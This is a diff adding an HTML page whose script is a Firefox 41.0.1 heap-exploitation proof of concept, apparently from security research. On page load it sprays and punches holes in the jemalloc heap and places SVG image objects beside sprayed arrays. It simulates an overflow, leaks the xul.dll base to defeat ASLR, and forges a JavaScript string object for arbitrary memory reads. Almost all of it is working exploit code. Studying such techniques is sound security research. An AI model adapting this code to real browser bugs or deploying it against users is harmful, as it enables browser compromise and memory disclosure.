@@ -1,0 +1,353 @@
+<html>
+<head>
+<script>
+
+// OR'LYEH? The Shadow over Firefox
+// argp@grhack.net
+
+function log(message)
+{
+    // requires: browser.dom.window.dump.enabled -> true
+    message += "\n";
+    window.dump(message);
+}
+
+function trigger_gc()
+{
+    var gca = new Array();
+
+    var str = "";
+    var p_node = document.createElement("p");
+    
+    document.body.appendChild(p_node);
+
+    for(var i = 0; i < 2000; i++)
+    {
+        str = "AAAAAAAAAAAAAAAAAAAAA";
+        str += Math.floor(Math.random() * 666);
+        p_node.innerHTML = p_node.textContent + str;
+        gca[i] = str;
+    }
+
+    return gca;
+}
+
+function hex_to_bytes(hex)
+{
+    var bytes = [];
+
+    for(var i = 0; i < hex.length; i += 2)
+    {
+        bytes.push(parseInt(hex.substr(i, 2), 16));
+    }
+
+    return bytes;
+}
+
+// from http://www.arahaya.com/canvasscript3/
+function bytes_to_double(bytes)
+{
+    var bias = 1023;
+    var n = bytes.length;
+    var s = bytes[0] & 0x80;
+    var e, m;
+    
+    if(n == 4)
+    {
+        e = ((bytes[0] & 0x7f) << 1) + (bytes[1] >> 7);
+        m = bytes[1] & 0x7f;
+    }
+    else
+    {
+        e = ((bytes[0] & 0x7f) << 4) + (bytes[1] >> 4);
+        m = bytes[1] & 0x0f;
+    }
+
+    for(var i = 2; i < n; i++)
+    {
+        m = m * 0x100 + bytes[i];
+    }
+
+    if(e == bias * 2 + 1)
+    {
+        if(m)
+        {
+            return 0 / 0;
+        }
+        
+        return (s ? -1 : +1) / 0;
+    }
+
+    var result =
+    e ? (m / Math.pow(2, 52) + 1) *
+    Math.pow(2, e - bias) : m / Math.pow(2, 52) / Math.pow(2, 1022);
+    
+    return s ? -result : result;
+}
+
+// from http://www.arahaya.com/canvasscript3/
+function double_to_bytes(n)
+{
+    if(isNaN(n))
+    {
+        return [0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff];
+    }
+    
+    if(n >= Number.POSITIVE_INFINITY)
+    {
+        return [0x7f, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
+    }
+    
+    if(n <= Number.NEGATIVE_INFINITY)
+    {
+        return [0xff, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
+    }
+    
+    if(n === 0)
+    {
+        return [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
+    }
+        
+    var s = n < 0 ? 0x80 : 0;
+    var t = Math.log((s ? -n : n)) / 0.6931471805599453;
+    var p = Math.floor(t);
+    var e, m;
+
+    if(p < -1022)
+    {
+        e = 0;
+        m = Math.pow(2, 52) * n * Math.pow(2, 1022);
+    }
+    else
+    {
+        e = p + 1023;
+        m = Math.pow(2, 52) * (Math.pow(2, t - p) - 1);
+    }
+    
+    var result = [0, 0, 0, 0, 0, 0, 0, 0];
+    
+    for(var i = 7; i > 0; --i)
+    {
+        var x = Math.floor(m / 0x100);
+        result[i] = m - x * 0x100;
+        m = x;
+    }
+        
+    result[7]  = (result[7] + 0.5) | 0;
+    result[1] += (e & 0x0f) << 4;
+    result[0]  = (e >> 4) + s;
+        
+    return result;
+}
+
+function bytes_to_hex(b)
+{
+    var hex_map =
+    {
+        0: "0",
+        1: "1",
+        2: "2",
+        3: "3",
+        4: "4",
+        5: "5",
+        6: "6",
+        7: "7",
+        8: "8",
+        9: "9",
+       10: "a",
+       11: "b",
+       12: "c",
+       13: "d",
+       14: "e",
+       15: "f"
+    };
+
+    var s1 = "";
+    var s2 = "";
+
+    for(var i = 0; i < (b.length / 2); i++)
+    {
+        s1 += hex_map[b[i] >> 4];
+        s1 += hex_map[b[i] % 16];
+    }
+
+    for(var i = (b.length / 2); i < b.length; i++)
+    {
+        s2 += hex_map[b[i] >> 4];
+        s2 += hex_map[b[i] % 16];
+    }
+
+    return [s2, s1];
+}
+
+function svg_poc()
+{
+    // 16777216 / 256 == 65536
+    var spray_size = 66000;
+    
+    var container = new Array();
+
+    document.body.innerHTML += "[*] starting<br>";
+    log("[*] starting the spray of ArrayObject objects");
+
+    for(var i = 0; i < spray_size; i++)
+    {
+        container[i] = new Array();
+
+        for(var j = 0; j < 30; j += 2) // 30 * 8 == 240
+        {
+            container[i][j]     = 0x45464645;
+            container[i][j + 1] = 0x47484847;
+        }
+    }
+
+    log("[*] creating holes on the jemalloc heap");
+
+    // for every allocation free two allocations to create holes
+    for(var i = 0; i < spray_size; i += 3)
+    {
+        delete(container[i]);
+        container[i] = null;
+        container[i] = undefined;
+
+        delete(container[i + 1]);
+        container[i + 1] = null;
+        container[i + 1] = undefined;
+    }
+    
+    var gc_ret = trigger_gc();
+    Math.atan2(gc_ret.length);
+
+    log("[*] positioning the SVGImageElement vulnerable objects");
+
+    // position the vulnerable objects
+    for(var i = 0; i < spray_size; i += 3)
+    {
+        // SVGImageElement is a 0x100-sized object
+        container[i] =
+        document.createElementNS("http://www.w3.org/2000/svg", "image");
+
+        container[i + 1] = new Uint32Array(64);
+
+        for(var j = 0; j < 64; j++)
+        {
+            container[i + 1][j] = 0x51575751;
+        }
+
+        // trigger the overflow bug here in all allocations
+    }
+
+    log("[*] bug simulation mode on");
+    Math.acos(container.length);
+
+    // or, trigger the overflow bug here in a specific allocation, e.g.:
+    // container[1666].some_vulnerable_method();
+
+    log("[*] bug simulation mode off");
+
+    var pwned_index = 0;
+
+    for(var i = 2; i < spray_size; i += 3)
+    {
+        if(container[i].length > 500)
+        {
+            var pwnstr = "[*] corrupted array found at index: " + i;
+            log(pwnstr);
+            pwnstr += "<br>";
+            document.body.innerHTML += pwnstr;
+
+            pwned_index = i;
+            break;
+        }
+    }
+
+    // out-of-bounds read
+
+    // xul base leak
+
+    var val_hex =
+    bytes_to_hex(double_to_bytes(container[pwned_index][30]));
+    
+    var known_xul_addr = 0x121deba0; // 41.0.1 specific
+    var leaked_xul_addr = parseInt(val_hex[1], 16);
+    var aslr_offset = leaked_xul_addr - known_xul_addr;
+    var xul_base = 0x10000000 + aslr_offset;
+
+    var val_str =
+    "[*] leaked xul.dll base address: 0x" + xul_base.toString(16);
+    
+    log(val_str);
+    
+    document.body.innerHTML += val_str + "<br>";
+
+    // our controlled object's address,
+    // i.e.: start of the SVGImageElement object
+    // (after our corrupted ArrayObject)
+
+    val_hex = bytes_to_hex(double_to_bytes(container[pwned_index][35]));
+    
+    val_str = "[*] victim SVGImageElement object is at: 0x" + val_hex[0];
+    log(val_str);
+    document.body.innerHTML += val_str + "<br>";
+
+    // transform our relative leak to an arbitrary leak
+
+    var obj_addr = parseInt(val_hex[0], 16);
+    var fake_jsstring_addr = obj_addr + 0x110;
+
+    // create a fake string-type jsval at the start
+    // of each sprayed Uint32Array object
+
+    for(var i = 0; i < spray_size; i += 3)
+    {
+        container[i + 1][0] = fake_jsstring_addr;
+        container[i + 1][1] = 0xffffff85;
+    }
+
+    // create a fake jsstring at [64] and [65]
+    var read_len = "00000002";
+    write_val_bytes = hex_to_bytes(read_len + "00000049");
+    write_val_double = bytes_to_double(write_val_bytes);
+    container[pwned_index][64] = write_val_double;
+
+    var read_addr = xul_base.toString(16);
+    write_val_bytes = hex_to_bytes("00000000" + read_addr);
+    write_val_double = bytes_to_double(write_val_bytes);
+    container[pwned_index][65] = write_val_double;
+
+    // let's read from our fake jsstring; it is at [62]
+    var leaked = "[*] leaked: " + container[pwned_index][62];
+    log(leaked);
+    document.body.innerHTML += leaked + "<br>";
+
+    Math.asin(container.length + pwned_index);
+
+    // now we can re-use the fake string-type jsval
+    // to leak from another location
+    read_addr = "cafebabe"; // crash to demonstrate
+    write_val_bytes = hex_to_bytes("00000000" + read_addr);
+    write_val_double = bytes_to_double(write_val_bytes);
+    container[pwned_index][65] = write_val_double;
+
+    Math.asin(container.length + pwned_index);
+
+    leaked = "[*] leaked: " + container[pwned_index][62];
+    log(leaked);
+
+    var clen = container.length + pwned_index;
+    return clen;
+}
+
+function svg_example_bug()
+{
+    var ret = svg_poc();
+    document.body.innerHTML += "[*] finished!<br>";
+}
+
+</script>
+</head>
+
+<body onload="svg_example_bug();">
+    
+</body>
+</html>
